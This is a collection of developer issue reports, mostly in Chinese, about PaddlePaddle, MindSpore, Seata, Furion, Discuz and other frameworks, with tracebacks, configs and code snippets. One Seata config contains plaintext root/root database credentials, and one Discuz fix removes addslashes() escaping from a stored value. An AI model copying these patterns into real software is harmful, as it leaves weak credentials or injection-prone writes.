static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) (x &gt;= static_cast&lt;T&gt;(0)) &amp;&amp; (x &lt;= one) Segmentation fault"
Fix the OpDesc construction in BlockDesc constructor,"https://github.com/PaddlePaddle/Paddle/blob/b15c675530db541440ddb5b7e774d522ecaf1533/paddle/framework/block_desc.cc#L164-L166 The code above is how the OpDesc is constructed when we call program.clone() on the python side. This construction will call the following function: https://github.com/PaddlePaddle/Paddle/blob/b15c675530db541440ddb5b7e774d522ecaf1533/paddle/framework/op_desc.h#L39-L42 Essentially, this calls a default assignment operator that copies the following data members: https://github.com/PaddlePaddle/Paddle/blob/b15c675530db541440ddb5b7e774d522ecaf1533/paddle/framework/op_desc.h#L141-L147 Because the attribute type in the AttributeMap could be a , cloning program desc in this way, makes for example the BLOCK attribute of the operator in the copied program desc points to a BlockDesc in the original program desc. This will be fixed along with #8161:Delete ""API"" section from ""Documentation""   <code>: BlockDesc* while"
静默启动时无法写入文件日志,"Furion 版本号 4.1.12 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp ConsoleApp 控制台应用中静默启动（代码写在下面），无法写入日志文件（没有生成日志文件） 无 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 静默启动方式可以写入日志文件   <code>: //silence: true, logging: false //silence: true, logging: true //以上都没写入文件 Serve.Run(GenericRunOptions.Default.Silence(silence: true, logging: true) .ConfigureBuilder(hostBuilder =&gt; hostBuilder.ConfigureServices( (hostContext, services) =&gt; { services.AddFileLogging(""application.log""); }))); Scoped.Create((fac, scope) =&gt; { ""写日志"".SetLoggerScoped(scope.ServiceProvider).LogInformation(); });"
变长序列可以用flatten压扁成一维tensor么？,"paddle版本： fluid 1.4 latest 环境：centos 6u3 模型从keras转fluid后预测： 报错信息如下： fluid部分相关模型结构： ` MEAN_sum = fluid.layers.data(name='mean_sum', shape=[1], dtype='float32') MEDIAN_sum = fluid.layers.data(name='median_sum', shape=[1], dtype='float32') fc1 = fluid.layers.fc(name='relu_fc1',input=attention_output,size=30,act='relu',bias_attr=True) flatten1 = fluid.layers.flatten(x=fc1, axis=1, name='flatten1') concat2 = fluid.layers.concat([flatten1,MEAN_sum,MEDIAN_sum],axis=1,name='concat2') fc2 = fluid.layers.fc(name='relu_fc2',input=concat2,size=10,act='relu',bias_attr=True) print ""fc2: "",fc2 final_output2 = fluid.layers.fc(name='final_output2',input=fc2, size=1,act=None,bias_attr=True)` 其中attention_output是变长序列，flatten1应该是压扁后的一维tensor，不知这样使用是否正确？   <code>: Traceback (most recent call last): File ""keras_2_fluid_all_part_map_diff_direction2_fix_multi_sum_output2.py"", line 433, in &lt;module&gt; fetch_list=[final_output1, final_output2],return_numpy=False) File ""/home/map01/.jumbo/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 565, in run use_program_cache=use_program_cache) File ""/home/map01/.jumbo/lib/python2.7/site-packages/paddle/fluid/executor.py"", line 642, in _run exe.run(program.desc, scope, 0, True, True, fetch_var_name) paddle.fluid.core.EnforceNotMet: Invoke operator concat error. Python Callstacks: File ""/home/map01/.jumbo/lib/python2.7/site-packages/paddle/fluid/framework.py"", line 1659, in append_op attrs=kwargs.get(""attrs"", None)) File ""/home/map01/.jumbo/lib/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/home/map01/.jumbo/lib/python2.7/site-packages/paddle/fluid/layers/tensor.py"", line 199, in concat attrs={'axis': axis}) File ""keras_2_fluid_all_part_map_diff_direction2_fix_multi_sum_output2.py"", line 133, in &lt;module&gt; concat2 = fluid.layers.concat([flatten1,MEAN_sum,MEDIAN_sum],axis=1,name='concat2') C++ Callstacks: Enforce failed. Expected out_dims[j] == ins[i][j], but received out_dims[j]:2 != ins[i][j]:1. Input tensors should have the same elements except the specify axis. at [/paddle/paddle/fluid/operators/concat_op.cc:66] PaddlePaddle Call Stacks: 0 0x7f054815a5a5p void paddle::platform::EnforceNotMet::Init&lt;std::string&gt;(std::string, char const*, int) + 357 1 0x7f054815a902p paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) + 82 2 0x7f0548492436p paddle::operators::ConcatOp::InferShape(paddle::framework::InferShapeContext*) const + 1526 3 0x7f0549297412p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;, paddle::framework::RuntimeContext*) const + 306 4 0x7f0549297ab3p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 563 5 0x7f0549295ac0p paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 240 6 0x7f05482b283ep paddle::framework::Executor::RunPreparedContext(paddle::framework::ExecutorPrepareContext*, paddle::framework::Scope*, bool, bool, bool) + 142 7 0x7f05482b56f4p paddle::framework::Executor::Run(paddle::framework::ProgramDesc const&amp;, paddle::framework::Scope*, int, bool, bool, std::vector&lt;std::string, std::allocator&lt;std::string&gt; &gt; const&amp;, bool) + 132 8 0x7f054814c1b4p 9 0x7f05481895fcp 10 0x7f057945a3e4p PyEval_EvalFrameEx + 25956 11 0x7f057945b130p PyEval_EvalCodeEx + 2240 12 0x7f05794594a1p PyEval_EvalFrameEx + 22049 13 0x7f057945b130p PyEval_EvalCodeEx + 2240 14 0x7f05794594a1p PyEval_EvalFrameEx + 22049 15 0x7f057945b130p PyEval_EvalCodeEx + 2240 16 0x7f057945b242p PyEval_EvalCode + 50 17 0x7f057947562cp 18 0x7f0579475700p PyRun_FileExFlags + 144 19 0x7f0579476c0cp PyRun_SimpleFileExFlags + 220 20 0x7f05794884ccp Py_Main + 3164 21 0x318ae1ecddp __libc_start_main + 253 22 0x400659p"
manylinux1 CPU fails at inference_anakin_api,"all manylinux1 CPU fail at inference_anakin_api related with #11818:动态图机制-DyGraph保持的模型有问题 https://paddleci.ngrok.io/viewLog.html?tab=buildLog&amp;buildTypeId=Manylinux1_CpuAvxCp27cp27mu&amp;buildId=577&amp;_focus=22377   <code>: [01:11:04] make[3]: *** No rule to make target `../inference_anakin_api', needed by `CMakeFiles/contrib_anakin_inference_lib'. Stop. [01:11:04] make[2]: *** [CMakeFiles/contrib_anakin_inference_lib.dir/all] Error 2 [01:11:04] make[2]: *** Waiting for unfinished jobs.... [01:11:04] Scanning dependencies of target paddle_fluid_api [01:11:04] [ 54%] Building CXX object paddle/fluid/inference/CMakeFiles/paddle_fluid_api.dir/io.cc.o [01:11:05] [ 54%] Built target paddle_inference_api_shared [01:11:08] [ 54%] Linking CXX static library libpaddle_fluid_api.a [01:11:09] [ 54%] Built target paddle_fluid_api [01:11:09] make[1]: *** [CMakeFiles/inference_lib_dist.dir/rule] Error 2 [01:11:09] make: *** [inference_lib_dist] Error 2"
【MindStudio提出】Resize报错image rows out of bounds.,"【Document Link】/【文档链接】 环境信息： Ascend910 mindspore==1.9.0 Python 3.7.5 报错API： mindspore.dataset.vision.Resize 实例化入参 size=(10, 10) interpolation = Inter.NEAREST 调用参数 image # size为（5,5,640） 报错日志： 【Issues Section】/【问题文档片段】 【Existing Issues】/【存在的问题】 【Expected Result】【预期结果】 Please fill in the expected result   <code>: Traceback (most recent call last): File ""/home/zhaolei/nets/tf-yolo_x2ms_2/yolo/train.py"", line 184, in &lt;module&gt; trainer.train(train_dataset) File ""/home/zhaolei/nets/tf-yolo_x2ms_2/yolo/train.py"", line 89, in train self.model = self.model(self.params['img_size']) File ""/home/zhaolei/nets/tf-yolo_x2ms_2/yolo/model/yolo.py"", line 31, in __call__ output = self.forward(x) File ""/home/zhaolei/nets/tf-yolo_x2ms_2/yolo/model/yolo.py"", line 43, in forward x = module(x) File ""/home/zhaolei/nets/tf-yolo_x2ms/x2ms_adapter/keras/functional_trace.py"", line 157, in try_trace_output output_data = func(*args, **kwargs) File ""/home/zhaolei/nets/tf-yolo_x2ms/x2ms_adapter/keras/base_layer.py"", line 59, in __call__ outputs = super().__call__(inputs, *args, **kwargs) File ""/home/zhaolei/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 625, in __call__ raise err File ""/home/zhaolei/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 621, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/zhaolei/.local/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 425, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/zhaolei/nets/tf-yolo_x2ms_2/yolo/model/module.py"", line 206, in construct method=self.method) File ""/home/zhaolei/nets/tf-yolo_x2ms/x2ms_adapter/transforms.py"", line 96, in fix_input output_data = func(*args_list, **kwargs) File ""/home/zhaolei/nets/tf-yolo_x2ms/x2ms_adapter/transforms.py"", line 263, in resize_image resized_images_list.append(resizer(image)) File ""/home/zhaolei/.local/lib/python3.7/site-packages/mindspore/dataset/vision/c_transforms.py"", line 80, in __call__ output_tensor_list = callable_op(tensor_row) RuntimeError: Unexpected error. Resize: in_image rows out of bounds. Line of code : 265 File : mindspore/ccsrc/minddata/dataset/kernels/image/image_utils.cc Process finished with exit code 1"
[Debugger] handle case where GPU operators re-use the input buffer,"RFC Details For GPU some operators re-use the input buffer as the output buffer (For D-chip, not a problem if set config file correctly), this is causing us to read the input incorrectly for some operators. Try to read input before execute operator Testcase import numpy as np import mindspore.context as context import mindspore.nn as nn from mindspore import Tensor from mindspore.ops import operations as P class Net(nn.Cell): def init(self): super(Net, self).init() self.add = P.TensorAdd() x = np.ones([1, 3, 3, 4]).astype(np.float32) y = np.ones([1, 3, 3, 4]).astype(np.float32) def test_net(): context.set_context(mode=context.GRAPH_MODE, device_target=""GPU"") add = Net() output = add(Tensor(x), Tensor(y)) print(x) print(y) print(output.asnumpy()) test_net() Trail No. Task Description Related Issue(URL) 1 2   <code>: def construct(self, x_, y_): return self.add(x_, y_)"
使用seata分布式事务，A模块使用feign调用B模块业务，B模块异常，A模块依然commit成功,"A模块：People 启动类： 这个模块为起点，远程调用B模块的服务 B模块：course feign： 降级fallbackFactory ： 被调用代码：手动模拟了抛出运行时异常 B模块抛出这个运行时异常，A模块不会滚，依然提交完成   <code>: spring: datasource: dynamic: datasource: # 主库数据源 master: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://10.1.1.33:3306/yun?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 username: root password: root # 从库数据源 slave: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://10.1.1.33:3306/yun-seata?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 username: root password: root # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭 seata: true # seata配置 seata: # 默认关闭，如需启用spring.datasource.dynami.seata需要同时开启 enabled: true # Seata 应用编号，默认为 ${spring.application.name} application-id: ${spring.application.name} # Seata 事务组编号，用于 TC 集群名 tx-service-group: yun-people-group # 自动代理 enable-auto-data-source-proxy: false # 服务配置项 service: # 虚拟组和分组的映射 vgroup-mapping: yun-people-group: default config: type: nacos nacos: serverAddr: 10.1.1.33:8850 group: SEATA_GROUP namespace: 55f2a013-dcf5-4bf7-8945-f9b9ee4e075e registry: type: nacos nacos: application: seata-server server-addr: 10.1.1.33:8850 namespace: 55f2a013-dcf5-4bf7-8945-f9b9ee4e075e client: undo: log-serialization: kryo //启动类添加@EnableSeataSpringConfig @EnableCustomConfig @EnableCustomSwagger2 @EnableRyFeignClients @SpringBootApplication @EnableSeataSpringConfig public class YunPeopleApplication { public static void main(String[] args) { SpringApplication.run(YunPeopleApplication.class, args); System.out.println(""(???)?? 学员管理启动成功 ?(??`?)? \n""); } } //业务代码，分布式事务发起者添加@GlobalTransactional()注解 @Override @Transactional @GlobalTransactional()// 重点 第一个开启事务的需要添加seata全局事务注解 public int insertStudent(Student student) { log.info(""=============新增学员分布式事务 START=================""); log.info(""新增学员分布式事务当前 XID: {}"", RootContext.getXID()); //新增学员的课程学习记录 AjaxResult ajaxResult = yunCourseFeignService.addlearnByNewStudent(orgListByOrgList, student.getPartArray(), student.getId()); log.info(""新增学员的课程学习记录结果：code="" + ajaxResult.get(""code"") + ""msg="" + ajaxResult.get(""msg"")); int i = studentMapper.insertStudent(student); log.info(""=============新增学员分布式事务 end=================""); return i; } 配置文件： spring: datasource: dynamic: datasource: # 主库数据源 master: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://10.1.1.33:3306/yun?useUnicode=true&amp;characterEncoding=utf8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=true&amp;serverTimezone=GMT%2B8 username: root password: root # 从库数据源 # slave: # username: # password: # url: # driver-class-name: # 开启seata代理，开启后默认每个数据源都代理，如果某个不需要代理可单独关闭 seata: true # seata配置 seata: # 默认关闭，如需启用spring.datasource.dynami.seata需要同时开启 enabled: true # Seata 应用编号，默认为 ${spring.application.name} application-id: ${spring.application.name} # Seata 事务组编号，用于 TC 集群名 tx-service-group: yun-course-group # 关闭自动代理 enable-auto-data-source-proxy: false # 服务配置项 service: # 虚拟组和分组的映射 vgroup-mapping: yun-course-group: default config: type: nacos nacos: serverAddr: 10.1.1.33:8850 group: SEATA_GROUP namespace: 55f2a013-dcf5-4bf7-8945-f9b9ee4e075e registry: type: nacos nacos: application: seata-server server-addr: 10.1.1.33:8850 namespace: 55f2a013-dcf5-4bf7-8945-f9b9ee4e075e client: undo: log-serialization: kryo @FeignClient(contextId = ""yunCourseFeignService"", value = ServiceNameConstants.COURSE_SERVICE,fallbackFactory = RemoteYunCourseFallbackFactory.class) public interface YunCourseFeignService { /** * 新增学员添加学习记录，要根据组织机构和角色查询到相应的课程 * @param orgList 组织机构 * @param partArray 角色 * @param studentId 学员 */ @PostMapping(""/learnRecord/addlearnByNewStudent"") public AjaxResult addlearnByNewStudent(@RequestParam(""orgList"") List&lt;String&gt; orgList, @RequestParam(""partArray"") String[] partArray, @RequestParam(""studentId"") String studentId); } @Component public class RemoteYunCourseFallbackFactory implements FallbackFactory&lt;YunCourseFeignService&gt; { private static final Logger log = LoggerFactory.getLogger(RemoteYunCourseFallbackFactory.class); @Override public YunCourseFeignService create(Throwable throwable) { log.error(""课程管理服务调用失败:{}"", throwable.getMessage()); return new YunCourseFeignService() { @Override public AjaxResult addlearnByNewStudent(List&lt;String&gt; orgList, String[] partArray, String studentId) { log.error(""新增学员添加学习记录远程调用失败:{}"", throwable.getMessage()); if(true){ throw new RuntimeException(""新增学员添加学习记录远程调用模拟抛出异常""); } return AjaxResult.error(""新增学员添加学习记录远程调用失败""); } }; } } //事务传播特性设置为 REQUIRES_NEW 开启新的事务 重要！！！！一定要使用REQUIRES_NEW @Override @Transactional(propagation = Propagation.REQUIRES_NEW) public AjaxResult addlearnByNewStudent(List&lt;String&gt; orgList, String[] partArray, String studentId) { log.info(""=============新增学员分布式事务添加学习记录 START=================""); log.info(""新增学员分布式事务添加学习记录当前 XID: {}"", RootContext.getXID()); Map&lt;String,Object&gt; params = new HashMap&lt;&gt;(); params.put(""orgList"",orgList); params.put(""partArray"",partArray); //int p = 1/0; if(true){ throw new RuntimeException(""模拟抛出异常""); } }"
Dont build Docker image at CI time,"Currently, we build a Docker image, which serves as the build toolkit for building Paddle, at CI time. The building of the Docker image includes steps to download and install third-party software, e.g., packages from Ubuntu mirrors. We suffered from problems that the Ubuntu mirror and other third-party services are out of order. @wanglei828 raised a discussion on WeChat that we should have the builder Docker image pre-built and cached on Dockerhub.com. This is a valuable idea. It would be even better if we can make sure that every time Dockerfile changes, we have the builder Docker image automatically rebuilt.   <code>: [10:22:04] E: Failed to fetch mirror://mirrors.ubuntu.com/mirrors.txt/pool/main/s/shared-mime-info/shared-mime-info_1.5-2ubuntu0.1_amd64.deb Hash Sum mismatch [10:22:04] [10:22:04] E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing? [10:22:04] Fetched 250 MB in 1min 24s (2954 kB/s) [10:22:05] The command '/bin/sh -c apt-get update &amp;&amp; apt-get install -y git python-pip python-dev openssh-server bison libnccl2=2.1.2-1+cuda8.0 libnccl-dev=2.1.2-1+cuda8.0 wget unzip unrar tar xz-utils bzip2 gzip coreutils ntp curl sed grep graphviz libjpeg-dev zlib1g-dev python-matplotlib gcc-4.8 g++-4.8 automake locales clang-format swig doxygen cmake liblapack-dev liblapacke-dev clang-3.8 llvm-3.8 libclang-3.8-dev net-tools libtool &amp;&amp; apt-get clean -y' returned a non-zero code: 100 [10:22:05] Process exited with code 100"
新增多文件上传,"SysFileController/uploadFile   <code>: /** * 多文件上传 */ @PostMapping(""/uploads"") public AjaxResult uploadFile(@RequestParam(""files"") MultipartFile[] files) { try { // 上传文件路径 AjaxResult ajax = new AjaxResult(); for (int i = 0; i &lt; files.length; i++) { String url = sysFileService.uploadFile(files[i]); if (!ObjectUtils.isEmpty(url)) { HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;(); map.put(""fileName"" + i, FileUtils.getName(url)); map.put(""url"" + i, url); ajax.put(""file"" + i, map); } } return AjaxResult.success(ajax); } catch (Exception e) { log.error(""上传文件失败"", e); return AjaxResult.error(e.getMessage()); } }"
【众智】【计算-AICPU开发】Logit,"Logit AICPU算子适配 + functional接口 + CPU算子迁移 + 算子反向 返回一个新的张量，其中包含输入元素的logit functional接口（小写加下划线） 接口目录：mindspore/python/mindspore/ops/function/math_func.py 算子原语 接口目录：mindspore/python/mindspore/ops/operations/math_ops.py x y eps float 属性 -1.0 对应底层算子 对应底层AI CPU算子Logit Classify Name Type TypeRange Required Doc AttrDefault INPUT x BasicType TRUE OUTPUT y BasicType TRUE ATTR eps float float FALSE -1.0 PyTorch1.8.1接口： torch.logit https://pytorch.org/docs/1.8.1/generated/torch.logit.html 3. 异常处理 4. 算子反向 参考torch/tools/autograd/derivatives.yaml: logit   <code>: def logit(x: tensor, eps=None: float) -&gt; tensor: return y class Logit(Primitive):"
Add Equal Operator Export ONNX,"Task Use this template for task tracking kind/task Task Description MindSpore模型导出转换成ONNX模型，具体实现细节可拆分为单个MindSpore算子到单个ONNX算子的转换，本任务是实现Equal算子的导出转换。 MindSpore导出ONNX模型的功能通过调用export接口启用，调用方式如下： 调用export后，实现导出ONNX功能的脚本是mindspore/mindspore/ccsrc/transform/express_ir/onnx_exporter.cc 该脚本实现ANF图转换为ONNX的ModelProto，主要流程包括参数的转换和节点的转换。 本任务是实现Equal节点的转换，其实就是将MindSpore的Equal算子的输入输出和属性对应转换到ONNX的Equal算子的输入输出和属性。 Task Goal 实现MindSpore Equal算子导出ONNX。   <code>: from mindspore import export export(net, input, file_name="""", file_format=""ONNX"")"
道具中心使用权限设置无效的BUG,/upload/source/admincp/admincp_magics.php 改为   <code>: $magicpermnew = addslashes(serialize($magicperm)); $magicpermnew = serialize($magicperm);
"[CT][MS]if in while in if net, export mindir fail",": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : pytest control_flow_export_mindir.py RuntimeError: mindspore/ccsrc/transform/express_ir/mindir_exporter.cc:156 GetDumpString] Get dump proto for graph 62_47_32_1_construct_wrapper.49 failed. pass   <code>: import numpy as np from mindspore.nn import Cell import mindspore.ops.operations as op from mindspore.common import Parameter, Tensor, dtype from mindspore.common.initializer import initializer from mindspore.train.serialization import export class ControlWhile(Cell): def __init__(self, input_shape, x, y): super().__init__() self.addn = op.AddN() self.assign = op.Assign() self.inputdata = Parameter(initializer(1, input_shape, dtype.float32), name=""global_step"") self.x = x self.y = y def construct(self, x, y, z, a, b, input1, input2): addn1 = self.addn([input1, input2, input1]) if x &gt; y: out = self.addn([input1, input1, input1]) while z &gt;= x: out = self.addn([out, addn1, input2]) if x &lt; a: addn1 = self.addn([out, addn1, input1]) else: addn1 = addn1 if x &lt;= b: out = self.addn([addn1, input2, out]) else: out = out if self.x &gt; self.y: out = self.addn([out, out]) else: out = out x = x + 1 else: out = self.assign(self.inputdata, input1) return out def test_control_flow_export_mindir(): x = np.array(1).astype(np.float32) y = np.array(0).astype(np.float32) z = np.array(5).astype(np.float32) a = np.array(3).astype(np.float32) b = np.array(2).astype(np.float32) input_shape = (1024, 512, 7, 7) input1 = np.random.randn(*input_shape).astype(np.float32) input2 = np.random.randn(*input_shape).astype(np.float32) net = ControlWhile(input_shape, Tensor(x), Tensor(y)) #out = net(Tensor(x), Tensor(y), Tensor(z), Tensor(a), Tensor(b), Tensor(input1), Tensor(input2)) export(net, Tensor(x), Tensor(y), Tensor(z), Tensor(a), Tensor(b), Tensor(input1), Tensor(input2), file_name=""ctrl.mindir"", file_format=""MINDIR"")"
关于mp的几个问题咨询，帮助文档上没有找到相关资料,1.当表支持逻辑删除时，怎么实现真删除 2.当表支持逻辑删除时，怎么实现可以查询已删除的数据 3.集成到springboot时，sql-injector是否支持多个injector的配置 4.集成springboot时，看到field-strategy，没有太明白改配置项的含义，具体是使用在什么场景和业务下？ 附：#IH67U:请教SqlParser的自定义时，如何拿到Mapper对应的Method我的方案 思路 1.通过MetaObject获取到MappedStatement的id，该ID是一个方法定义的全路径字符 eg:com.test.UserMapper.selectPage 2.解析上面的ID获取到对应的Class和Method，即可以获取到类和方法上定义的注解，然后实现自己的业务逻辑   <code>: MappedStatement ms = PluginUtils.getMappedStatement(metaObject); String stmtId = ms.getId(); Method method = MapperMethodCache.getMethod(stmtId); if (method == null){ return false; } OgnztDataFilter filter = method.getAnnotation(OgnztDataFilter.class); if (filter != null){ return true; } Class clazz = MapperMethodCache.getClass(stmtId); if (clazz == null){ return false; } filter = (OgnztDataFilter) clazz.getAnnotation(OgnztDataFilter.class); if (filter == null){ return false; } String [] exclues = filter.exclues(); for (String item : exclues){ if (item.equals(method.getName())){ return false; } } return true;
"redis.clients.jedis.exceptions.JedisDataException: ERR Client sent AUTH, but no password is set","问题描述：首次，只修改了数据库链接，默认配置，可以成功启动，但访问后台会报。经检查发现是 初始化时获取到的的值为空字符串，导致。 解决方式：若没设置连接密码，可以在初始化池前，判断下，若为空字符串，则重设值为，则可不启用认证模式。   <code>: clone redis redis.clients.jedis.exceptions.JedisDataException: ERR Client sent AUTH, but no password is set jedisPool = new JedisPool(new JedisPoolConfig(), this.host, this.port, this.timeout, this.password, database); this.password Client sent AUTH redis null"
【众智】【计算-AICPU接入】Diag,"AICPU算子接入 返回具有给定对角线值的对角线张量。 x y 对应底层算子 对应底层AI CPU算子Diag: @ops.RegisterGradient(""DiagPart"")   <code>: class Diag(Primitive):"
Implement NCCL2 distributed GPU training with GPU Direct and RDMA as a contrib module ,"NCCL2 provide a better performance over GPU distributed training, I'd like to provide it as a ""contrib"" module in Fluid, following things need to be done to make this work: Write a new operator: , which do the following things: on trainer 0: generate a new unique id, then send it to all other trainers using a gRPC client. on trainer 1~n: start a gRPC server, when receives the id, then stop execution. Append to the end of . Update to enable initializing across ranks of nodes. Update to use the multi node communicator. My prototype is at https://github.com/typhoonzero/nccl_rdma_demo   <code>: gen_nccl_id gen_nccl_id start_up_program nccl.h communicator nccl_all_reduce_op_handle"
表格转静态无法加载icon,"表格转静态 tread 中 无法加载出来 layui-icon 或者自定义 iconfont   <code>: &lt;thead&gt; &lt;tr&gt; &lt;th lay-data=""{field:'sitename',fixed:'left',width:140}""&gt;&lt;i class=""layui-icon layui-icon-xxx""&gt;&lt;/i&gt; 表头1&lt;/th&gt; &lt;th lay-data=""{field:'siterate',width:120}""&gt;&lt;i class=""iconfont icon-xxxx""&gt;&lt;/i&gt; 表头2&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt;"
在ascend上跑代码，修改学习率之后报错,"在callback中有如下代码 以上代码主要用于修改学习率（程序能跑通），可是当我直接将adjust_learning_rate里的lr = 0.001注释打开时，程序报错如下 这个过程仅仅只是修改了学习率，为什么会报错了呢？报错的原因是什么？   <code>: def step_end(self, run_context): def adjust_learning_rate(opt, cb_param): decay = 0.1 ** (self.exp_num) lr = self.args.lr * decay #lr = 0.001 decay = self.args.weight_decay net = cb_param.network opt = cb_param.optimizer pa = [] # 含有68个参数 其中每一个参数都是定义的group里面的参数。 for param in opt.parameters: pa.append(param) first_3d_conv_weight = pa[0:1] first_3d_conv_bias = pa[1: 2] normal_weight = pa[2:34] normal_bias = pa[34:66] bn = pa[66:68] lr_list = opt.get_lr_parameter(first_3d_conv_weight) for item in lr_list: item.assign_value(Tensor(lr, mstype.float32)) lr_list = opt.get_lr_parameter(first_3d_conv_bias) for item in lr_list: item.assign_value(Tensor(lr, mstype.float32)) lr_list = opt.get_lr_parameter(normal_weight) for item in lr_list: item.assign_value(Tensor(lr, mstype.float32)) lr_list = opt.get_lr_parameter(normal_bias) for item in lr_list: item.assign_value(Tensor(lr, mstype.float32)) lr_list = opt.get_lr_parameter(bn) for item in lr_list: item.assign_value(Tensor(lr, mstype.float32)) cb_param = run_context.original_args() opt = cb_param.optimizer adjust_learning_rate(opt, cb_param) [ERROR] GE(73678,fffe8d7fe1e0,python):2021-11-11-17:49:48.347.300 [mindspore/ccsrc/runtime/device/ascend/ge_runtime/runtime_model.cc:232] Run] Call rt api rtStreamSynchronize failed, ret: 507011 